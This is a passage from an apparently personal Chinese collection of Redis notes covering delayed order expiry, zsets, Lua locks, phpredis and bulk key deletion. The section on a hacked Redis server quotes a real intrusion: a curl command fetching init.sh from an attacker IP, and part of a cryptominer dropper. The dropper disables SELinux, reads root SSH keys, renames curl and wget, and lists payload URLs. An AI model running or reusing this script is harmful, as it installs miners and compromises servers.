 <span class="comment">//这里是接收到用户传来的下单信息，存入数据库后，返回一个订单id</span></span><br><span class="line">        <span class="comment">//我们让返回的订单ID为2019</span></span><br><span class="line">        $order_id = <span class="number">2019</span>;</span><br><span class="line">        <span class="comment">//因为一个项目中可能会有很多使用到setex的地方，所以给订单id加个前缀</span></span><br><span class="line">        $order_prefix_id = <span class="string">'order_'</span>.$order_id;</span><br><span class="line">        <span class="comment">//将订单ID存入redis缓存中，并且设置过期时间为5秒</span></span><br><span class="line">        $key_name = $order_prefix_id; <span class="comment">//我们在订阅中只能接收到$key_name的值</span></span><br><span class="line">        $expire_second = <span class="number">5</span>; <span class="comment">//设置过期时间，单位为秒</span></span><br><span class="line">        $value = $order_id;</span><br><span class="line">        Redis::setex($key_name,$expire_second,$value);</span><br><span class="line">        echo <span class="string">"设置过期key="</span>.$order_prefix_id.<span class="string">"成功"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//项目中有可能用的redis不是0，所以这里用env配置里面获取的</span></span><br><span class="line">        $publish_num=env(<span class="string">'REDIS_DATABASE'</span>, <span class="number">0</span>);</span><br><span class="line">        Redis::psubscribe([<span class="string">'__keyevent@'</span>.$publish_num.<span class="string">'__:expired'</span>], <span class="function"><span class="keyword">function</span> (<span class="params">$message, $channel</span>) </span>&#123;</span><br><span class="line">            <span class="comment">//$message 就是我们从获取到的过期key的名称</span></span><br><span class="line">            $explode_arr=explode(<span class="string">'_'</span>,$message);</span><br><span class="line">            $prefix=$explode_arr[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">if</span>($prefix==<span class="string">'order'</span>)&#123;</span><br><span class="line">                $order_id=$explode_arr[<span class="number">1</span>];</span><br><span class="line">                echo $order_id;</span><br><span class="line">                <span class="comment">//这里就是编写过期的订单，过期后要如何处理的业务逻辑</span></span><br><span class="line">                <span class="comment">//TODO</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">   监听处理程序只要一台处理，把监听处理的过程改一下，取出订单 ID 之后不要去处理，通过 rpush 放到一个 redis 的队列里去。另外起几台服务器，连到这个 redis 服务器，通过 blpop 接收消息队列里出来的订单 ID。这样，多台机器可以同时工作，一个订单只会从 blpop 里出来一次，不会重复执行，多台机器可以分担任务，又互不影响。消息队列也可以换成业界成熟的 rabbitmq 、 kafka 之类的专业消息队列，那又是另外一个话题了。反正业务量大了，变复杂了，消息总线跑不掉，天猫京东也差不多如此https:<span class="comment">//learnku.com/articles/21488 </span></span><br><span class="line">    </span><br><span class="line">    使用 zset 比利用 redis 的大 key set 这样的形式，节约一些空间占用，定时任务处理方面，可以使用 swoole 的 swoole_timer_tick 全都是内存级的操作，会提升很多效率。https:<span class="comment">//alpha2016.github.io/2019/02/24/%E5%80%9F%E5%8A%A9Swoole%E5%AE%9A%E6%97%B6%E8%BF%87%E6%9C%9F%E6%9C%AA%E6%94%AF%E4%BB%98%E8%AE%A2%E5%8D%95/</span></span><br><span class="line">    借助 redis 的 zset 有序集合，订单产生的时候，zadd orders timestamp orderid 将 orderid 保存到对应的 orders 集合中，以时间戳作为他的 score 分值，存储部分是这样的，简单 + 占用空间内存极小。读取部分： 在 swoole 启动时，设置定时器，每分钟去 orders set 中读取设置的时间之前的数据，个人为了测试方便，设置的读取前一分钟到前三十分钟内的数据。获取到数据之后，根据业务逻辑处理数据，然后 zrem orders orderid 命令从集合中移除对应的 orderid。个人以为这个方案是内存占用和效率兼具的一个方案</span><br><span class="line">    </span><br><span class="line">    &lt;?php</span><br><span class="line">    $server = <span class="keyword">new</span> swoole_websocket_server(<span class="string">"0.0.0.0"</span>, <span class="number">9502</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 在定时器中使用协程需要增加此项配置 </span></span><br><span class="line">    $server-&gt;set(</span><br><span class="line">        [</span><br><span class="line">            <span class="string">'enable_coroutine'</span> =&gt; <span class="literal">true</span></span><br><span class="line">        ]</span><br><span class="line">    );</span><br><span class="line">    </span><br><span class="line">    $server-&gt;on(<span class="string">'workerStart'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">$server, $workerId</span>) </span>&#123;</span><br><span class="line">        $redis = <span class="keyword">new</span> Swoole\Coroutine\Redis();</span><br><span class="line">        $redis-&gt;connect(<span class="string">'127.0.0.1'</span>, <span class="number">6379</span>);</span><br><span class="line">    </span><br><span class="line">        <span class="comment">// tick 为持续触发的定时器 </span></span><br><span class="line">        swoole_timer_tick(<span class="number">10000</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">use</span> (<span class="params">$redis</span>) </span>&#123;</span><br><span class="line">            $upperLimitTime = strtotime(<span class="string">'-1 minute'</span>);</span><br><span class="line">            $lowerLimitTime = strtotime(<span class="string">'-30 minute'</span>);</span><br><span class="line">            echo <span class="string">'上限时间:'</span> . $upperLimitTime . <span class="string">'下限时间:'</span> . $lowerLimitTime;</span><br><span class="line">            $result = $redis-&gt;zrangebyscore(<span class="string">'orders'</span>, $lowerLimitTime, $upperLimitTime);</span><br><span class="line">            var_dump($result);</span><br><span class="line">    </span><br><span class="line">            <span class="comment">// 根据查询到的 id 进行业务处理，然后 zrem orders orderid 移除处理成功的 orderid          </span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    $server-&gt;on(<span class="string">'message'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">swoole_websocket_server $server, $request</span>) </span>&#123;</span><br><span class="line">        $server-&gt;push($request-&gt;fd, <span class="string">"hello"</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    $server-&gt;start();</span><br></pre></td></tr></table></figure>
<h3 id="数据类型不一致"><a href="#数据类型不一致" class="headerlink" title="数据类型不一致"></a>数据类型不一致</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">两处使用了一个 zSets，一处是从网页获取数据，放到 zSets 里面；另一处是从数据库获取数据放到 zSets 里面。在后期做清除数据操作的时候，发现了数据清除的不完全，后来仔细的检查了一下。发现数据重复。</span><br><span class="line">https:<span class="comment">//www.h57.pw/2016/09/20/redis-zsets-data-type-inconsistency/</span></span><br><span class="line">仔细测试了好一会儿之后，才发现了问题坐在，就是当 score 相同的时候，相同的 value 会覆盖数据，这里的 value 相同，并不仅仅是值相同，而且数据类型也应该一致才会覆盖。否则就会产生 score 相同的两条数据。</span><br></pre></td></tr></table></figure>
<h3 id="Redis-被黑"><a href="#Redis-被黑" class="headerlink" title="Redis 被黑"></a>Redis 被黑</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//learnku.com/laravel/t/28411</span></span><br><span class="line">MISCONF Redis is configured to save RDB snapshots, but it is currently not able to persist on disk. Commands that may modify the data set are disabled, because <span class="keyword">this</span> instance is configured to report errors during writes <span class="keyword">if</span> RDB snapshotting fails (stop-writes-on-bgsave-error option). Please check the Redis logs <span class="keyword">for</span> details about the RDB error.</span><br><span class="line">之后通过 <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; config set stop-writes-on-bgsave-error no 命令解决了问题</span><br><span class="line">执行 curl -fsSL http:<span class="comment">//198.13.42.229:8667/6HqJB0SPQqbFbHJD/init.sh 等命令得了一些脚本</span></span><br><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">setenforce <span class="number">0</span> <span class="number">2</span>&gt;dev/<span class="literal">null</span></span><br><span class="line">echo SELINUX=disabled &gt; <span class="regexp">/etc/</span>sysconfig/selinux <span class="number">2</span>&gt;<span class="regexp">/dev/</span><span class="literal">null</span></span><br><span class="line">sync &amp;&amp; echo <span class="number">3</span> &gt;<span class="regexp">/proc/</span>sys/vm/drop_caches</span><br><span class="line">crondir=<span class="string">'/var/spool/cron/'</span><span class="string">"$USER"</span></span><br><span class="line">cont=<span class="string">`cat <span class="subst">$&#123;crondir&#125;</span>`</span></span><br><span class="line">ssht=<span class="string">`cat /root/.ssh/authorized_keys`</span></span><br><span class="line">echo <span class="number">1</span> &gt; <span class="regexp">/etc/</span>sysupdates</span><br><span class="line">rtdir=<span class="string">"/etc/sysupdates"</span></span><br><span class="line">bbdir=<span class="string">"/usr/bin/curl"</span></span><br><span class="line">bbdira=<span class="string">"/usr/bin/cur"</span></span><br><span class="line">ccdir=<span class="string">"/usr/bin/wget"</span></span><br><span class="line">ccdira=<span class="string">"/usr/bin/wge"</span></span><br><span class="line">mv /usr/bin/wget /usr/bin/get</span><br><span class="line">mv /usr/bin/xget /usr/bin/get</span><br><span class="line">mv /usr/bin/get /usr/bin/wge</span><br><span class="line">mv /usr/bin/curl /usr/bin/url</span><br><span class="line">mv /usr/bin/xurl /usr/bin/url</span><br><span class="line">mv /usr/bin/url /usr/bin/cur</span><br><span class="line">miner_url=<span class="string">"https://pixeldrain.com/api/download/Y0o4foA1"</span></span><br><span class="line">miner_url_backup=<span class="string">"http://198.13.42.229:8667/6HqJB0SPQqbFbHJD/sysupdate"</span></span><br><span class="line">miner_size=<span class="string">"854364"</span></span><br><span class="line">sh_url=<span class="string">"http://198.13.42.229:8667/6HqJB0SPQqbFbHJD/update.sh"</span></span><br><span class="line">sh_url_backup=<span class="string">"http://198.13.42.229:8667/6HqJB0SPQqbFbHJD/update.sh"</span></span><br><span class="line">config_url=<span class="string">"http://198.13.42.229:8667/6HqJB0SPQqbFbHJD/config.json"</span></span><br><span class="line">config_url_backup=<span class="string">"http://198.13.42.229:8667/6HqJB0SPQqbFbHJD/config.json"</span></span><br><span class="line">config_size=<span class="string">"3300"</span></span><br><span class="line">scan_url=<span class="string">"https://pixeldrain.com/api/download/OMKMU5Td"</span></span><br><span class="line">scan_url_backup=<span class="string">"http://198.13.42.229:8667/6HqJB0SPQqbFbHJD/networkservice"</span></span><br><span class="line">scan_size=<span class="string">"2584064"</span></span><br><span class="line"></span><br><span class="line">https:<span class="comment">//www.freebuf.com/vuls/148758.html  查看线上环境是否使用了 redis-weui 了</span></span><br></pre></td></tr></table></figure>
<h3 id="加锁和解锁问题"><a href="#加锁和解锁问题" class="headerlink" title="加锁和解锁问题"></a>加锁和解锁问题</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($redis-&gt;set(<span class="string">'my:lock'</span>, <span class="number">1</span>, [<span class="string">'NX'</span>])) &#123;</span><br><span class="line">        # todo</span><br><span class="line"></span><br><span class="line">        $redis-&gt;del(<span class="string">'my:lock'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">其中NX — 表示只有key不存在的时候才设置https:<span class="comment">//shuwoom.com/?p=2833</span></span><br><span class="line"><span class="keyword">if</span> ($redis-&gt;set(<span class="string">'my:lock'</span>, <span class="number">1</span>, [<span class="string">'NX'</span>, <span class="string">'EX'</span> =&gt; <span class="number">10</span>])) &#123;</span><br><span class="line">        # todo</span><br><span class="line"></span><br><span class="line">        $redis-&gt;del(<span class="string">'my:lock'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    原子性问题而面临上面同样的问题。所以这里要用到lua脚本来解决。</span><br><span class="line">    </span><br><span class="line">        $script = <span class="string">'</span></span><br><span class="line"><span class="string">    if redis.call("get",KEYS[1]) == ARGV[1]</span></span><br><span class="line"><span class="string">    then</span></span><br><span class="line"><span class="string">        return redis.call("del",KEYS[1])</span></span><br><span class="line"><span class="string">    else</span></span><br><span class="line"><span class="string">        return 0</span></span><br><span class="line"><span class="string">    end</span></span><br><span class="line"><span class="string">        '</span>;</span><br><span class="line">        $token = uniqid(mt_rand(), <span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">if</span> ($redis-&gt;set(<span class="string">'my:lock'</span>, $token, [<span class="string">'NX'</span>, <span class="string">'EX'</span> =&gt; <span class="number">10</span>])) &#123;</span><br><span class="line">            # todo</span><br><span class="line">    </span><br><span class="line">            $redis-&gt;<span class="built_in">eval</span>($script, [<span class="string">"my:lock"</span>, $token], <span class="number">1</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            echo <span class="string">'get lock failed!'</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<h3 id="php-redis"><a href="#php-redis" class="headerlink" title="php redis"></a>php redis</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    $redis = <span class="keyword">new</span> Redis();</span><br><span class="line">    $redis-&gt;connect('127.0.0.1', 6379, 1); # 短连接，超过1秒放弃连接https://shuwoom.com/?p=2786</span><br><span class="line"><span class="comment">//    $redis-&gt;open('127.0.0.1', 6379, 1); # 同上</span></span><br><span class="line"><span class="comment">//    $redis-&gt;pconnect('127.0.0.1', 6379, 1); # 长连接，超过1秒放弃连接</span></span><br><span class="line">    $redis-&gt;popen('127.0.0.1', 6379, 1); # 同上</span><br><span class="line"></span><br><span class="line">    # 登录验证密码，返回：true或false</span><br><span class="line">    <span class="keyword">if</span> ($redis-&gt;auth(<span class="string">'password'</span>)) &#123;</span><br><span class="line">        echo <span class="string">'auth success!'</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        echo <span class="string">'auth failed!'</span>;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">'Redis auth failed!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $redis-&gt;select(0); # 选择redis库，0~15，共16个库</span><br><span class="line">    $redis-&gt;close(); # 释放资源</span><br><span class="line"><span class="comment">//    $redis-&gt;ping(); # 检查是否还在连接</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception $e) &#123;</span><br><span class="line">    var_dump($e-&gt;getMessage());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">ping ping我们的主机能否链接 链接是否存活</span><br><span class="line">echo 命令 echo demo直接输出</span><br><span class="line">select 选择数据库 select <span class="number">0</span><span class="number">-16</span>个数据库</span><br><span class="line">quit exit 退出链接</span><br><span class="line">dbsize 返回数据库的键的个数</span><br><span class="line">info 返回服务器相关信息</span><br><span class="line">config get 返回服务配置信息</span><br><span class="line">flush db 清空数据库</span><br><span class="line">flushall 删除所有数据库中所有的键</span><br><span class="line">Key-values</span><br><span class="line">keys * 匹配键所有的键. 模糊匹配 keys my* 取出所有已my开头的键</span><br><span class="line">exists 判断是否键 exists name判断是否有name这个键是否存在</span><br><span class="line">del 删除键 del name 删除name的键</span><br><span class="line">expire 设置过期时间 expire key time</span><br><span class="line">ttl key 查看键的过期时间</span><br><span class="line">select database 选择数据库</span><br><span class="line">move key dababase1 讲key移动dao database1中的数据库中</span><br><span class="line">persist 取消键的过期时间</span><br><span class="line">randomkey 随机返回一个键的值</span><br><span class="line">rename 重命名一个键</span><br><span class="line">type key 判断key的数据类型</span><br><span class="line">批量删除 <span class="number">0</span>号数据库中名称含有OMP_OFFLINE的key：</span><br><span class="line"></span><br><span class="line">src/redis-cli -n <span class="number">0</span> keys <span class="string">"*OMP_OFFLINE*"</span>|xargs src/redis-cli -n <span class="number">0</span> del</span><br><span class="line">在redis的客户端环境中并不支持批量删除。</span><br><span class="line"></span><br><span class="line">可以把某个keys的结果全部输出到文件中，比如keys.log</span><br><span class="line"></span><br><span class="line">redis-cli -p port -c command &gt; keys.log</span><br><span class="line">https:<span class="comment">//anttutu.github.io/2017/06/redis/</span></span><br></pre></td></tr></table></figure>
<h3 id="批量删除redis的key"><a href="#批量删除redis的key" class="headerlink" title="批量删除redis的key"></a>批量删除redis的key</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h host -p <span class="number">6379</span> -a pwd -n <span class="number">15</span> --scan --pattern <span class="string">'exchange*'</span> | xargs <span class="number">-0</span> -n <span class="number">5000</span> redis-cli -h host -a pwd -p <span class="number">6379</span> -n <span class="number">15</span> DEL</span><br><span class="line">-h 你的redis服务器地址</span><br><span class="line">-p 端口 默认<span class="number">6379</span></span><br><span class="line">-a 密码</span><br><span class="line">-n 选择redis对应的db</span><br><span class="line"></span><br><span class="line">xargs参数:</span><br><span class="line">-n 按每n个为一组输出参数，如果redis的Key数量大的话可以增加此参数,否则会报错 argument list too long</span><br><span class="line"><span class="number">-0</span> 当key还有引号等特殊字符,加此参数可以屏蔽,使特殊字符失效,不加会报错:</span><br><span class="line">https:<span class="comment">//segmentfault.com/a/1190000016717860</span></span><br><span class="line">每次扫<span class="number">10</span>条 redis-cli  --scan --pattern <span class="string">'app:uid:reg:date:707*'</span>|xargs -n <span class="number">10</span> redis-cli mget</span><br><span class="line"></span><br><span class="line">登录redis通过info查看，内存使用<span class="number">25</span>G多，而KEY也有<span class="number">1.44</span>亿了。。。REIDS中有大量无用而又未设置过期时间的KEY存在。设置个过期时间，举手之劳的事，还是有必要的。</span><br><span class="line"></span><br><span class="line">used_memory_human:<span class="number">24.72</span>G</span><br><span class="line">db0:keys=<span class="number">144856453</span>,expires=<span class="number">25357</span></span><br><span class="line">通过测试机执行 keys prefix* 导致REDIS卡死，其他连接也连不上。所以定位到问题出现在keys命令上，也正如手册上说的造成性能问题。</span><br><span class="line"></span><br><span class="line">如何删除未用到的KEY？</span><br><span class="line"></span><br><span class="line">大部分KEY是有规律的，有特定前缀，需要拿到特定前缀的KEY然后删除，网上有这样的命令：</span><br><span class="line"></span><br><span class="line">redis-cli -a redis-pwd -n <span class="number">0</span> keys <span class="string">"preffix*"</span> | xargs redis-cli -p <span class="number">6379</span> -a redis-pwd -n <span class="number">0</span> del</span><br><span class="line">测试机执行keys “preffix<span class="number">-1</span>*“时间大概<span class="number">40</span>多s，这意味着redis要停<span class="number">40</span>s+，而前缀是按天设置的，这样子需要操作多次，因为业务的原因，不允许这么操作，分分钟都是钱~最后想到的办法是先从测试机上把满足条件的key导到文本，前面的语句通过cat文本去拿。如：</span><br><span class="line"></span><br><span class="line">redis-cli -p <span class="number">6380</span> -a redis-pwd keys <span class="string">"preffix-1*"</span> &gt; <span class="regexp">/home/</span>keys_redis/preffix<span class="number">-1</span></span><br><span class="line">然后通过这些数据删掉生产环境上的key。</span><br><span class="line"></span><br><span class="line">cat /home/keys_redis/preffix<span class="number">-1</span> | xargs redis-cli -a redis-pwd -n <span class="number">0</span> del</span><br><span class="line">删除的速度非常快，内存耗的也挺快，感觉像是有多少耗多少的。执行之后KEY的数量减少了<span class="number">95</span>%+，内存也从<span class="number">25</span>G降到了<span class="number">2</span>G。不过有一个指数升高：mem_fragmentation_ratio，前后的memory对比：</span><br><span class="line"></span><br><span class="line"># Memory 处理前</span><br><span class="line">used_memory:<span class="number">26839186032</span></span><br><span class="line">used_memory_human:<span class="number">25.00</span>G</span><br><span class="line">used_memory_rss:<span class="number">23518339072</span></span><br><span class="line">used_memory_peak:<span class="number">26963439000</span></span><br><span class="line">used_memory_peak_human:<span class="number">25.11</span>G</span><br><span class="line">used_memory_lua:<span class="number">31744</span></span><br><span class="line">mem_fragmentation_ratio:<span class="number">0.88</span></span><br><span class="line">mem_allocator:jemalloc<span class="number">-3.2</span><span class="number">.0</span></span><br><span class="line"></span><br><span class="line"># Memory 处理后</span><br><span class="line">used_memory:<span class="number">2399386704</span></span><br><span class="line">used_memory_human:<span class="number">2.23</span>G</span><br><span class="line">used_memory_rss:<span class="number">4621533184</span></span><br><span class="line">used_memory_peak:<span class="number">26963439000</span></span><br><span class="line">used_memory_peak_human:<span class="number">25.11</span>G</span><br><span class="line">used_memory_lua:<span class="number">31744</span></span><br><span class="line">mem_fragmentation_ratio:<span class="number">1.93</span></span><br><span class="line">mem_allocator:jemalloc<span class="number">-3.2</span><span class="number">.0</span></span><br><span class="line"></span><br><span class="line">https:<span class="comment">//itopic.org/redis-delete-keys.html</span></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$redis = <span class="keyword">new</span> Redis();</span><br><span class="line"><span class="comment">//设置扩展在一次scan没有查找出记录时 进行重复的scan 直到查询出结果或者遍历结束为止</span></span><br><span class="line">$redis-&gt;setOption(Redis::OPT_SCAN, <span class="attr">Redis</span>::SCAN_RETRY);</span><br><span class="line"></span><br><span class="line">$match = <span class="string">'foo:*'</span>;</span><br><span class="line">$count = <span class="number">10000</span>;</span><br><span class="line">$it=<span class="literal">null</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//这种用法下我们只需要简单判断返回结果是否为空即可, 如果为空说明遍历结束</span></span><br><span class="line"><span class="keyword">while</span> ($keys = $redis-&gt;scan($it, $match, $count)) &#123;</span><br><span class="line">    $redis-&gt;del($keys);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">在删除的同时注意监控内存变化情况，就能确认问题了：</span><br><span class="line"></span><br><span class="line">shell&gt; watch -d -n <span class="number">1</span> <span class="string">'/path/to/redis-cli info | grep memory'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 设置遍历的特性为不重复查找，该情况下扩展只会scan一次，所以可能会返回空集合 */</span></span><br><span class="line">$redis-&gt;setOption(Redis::OPT_SCAN, <span class="attr">Redis</span>::SCAN_NORETRY);</span><br><span class="line"> </span><br><span class="line">$it = NULL;</span><br><span class="line">$pattern = <span class="string">'*'</span>;</span><br><span class="line">$count = <span class="number">50</span>;  <span class="comment">// 每次遍历50条，注意是遍历50条，遍历出来的50条key还要去匹配你的模式，所以并不等于就能够取出50条key</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">    $keysArr = $redis-&gt;scan($it, $pattern, $count);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> ($keysArr)</span><br><span class="line">    &#123;</span><br><span class="line">        foreach ($keysArr <span class="keyword">as</span> $key)</span><br><span class="line">        &#123;</span><br><span class="line">            echo $key . <span class="string">"\n"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125; <span class="keyword">while</span> ($it &gt; <span class="number">0</span>);   <span class="comment">//每次调用 Scan会自动改变 $it 值，当$it = 0时 这次遍历结束 退出循环</span></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">https:<span class="comment">//blog.csdn.net/zhang197093/article/details/74615717</span></span><br><span class="line">https:<span class="comment">//blog.huoding.com/2014/04/11/343</span></span><br></pre></td></tr></table></figure>
<h3 id="有序集合实现-24-小时排行榜实时更新"><a href="#有序集合实现-24-小时排行榜实时更新" class="headerlink" title="有序集合实现 24 小时排行榜实时更新"></a>有序集合实现 24 小时排行榜实时更新</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">利用 ZADD 按小时划分添加用户的积分信息，然后用 ZUNIONSTORE 并集实现 <span class="number">24</span> 小时的游戏积分总和，实现 “<span class="number">24</span> 小时排行榜”；</span><br><span class="line"></span><br><span class="line">   ZUNIONSTORE destination numkeys key [key ...]</span><br><span class="line">    Redis Zunionstore 命令计算给定的一个或多个有序集的并集，其中给定 key 的数量必须以 numkeys 参数指定，并     将该并集(结果集)储存到 destination 。</span><br><span class="line">    默认情况下，结果集中某个成员的分数值是所有给定集下该成员分数值之和 。</span><br><span class="line">    </span><br><span class="line">    Redis 在遇到分数相同时是按照集合成员自身的字典顺序来排序，这里即是按照”user2″和”user3″这两个字符串进行排序，以逆序排序的话 user3 自然排到了前面。要解决这个问题，我们可以考虑在分数中加入时间戳，计算公式为：</span><br><span class="line">    带时间戳的分数 = 实际分数*<span class="number">10000000000</span> + (<span class="number">9999999999</span> – timestamp) </span><br><span class="line">    https:<span class="comment">//learnku.com/articles/30279</span></span><br></pre></td></tr></table></figure>
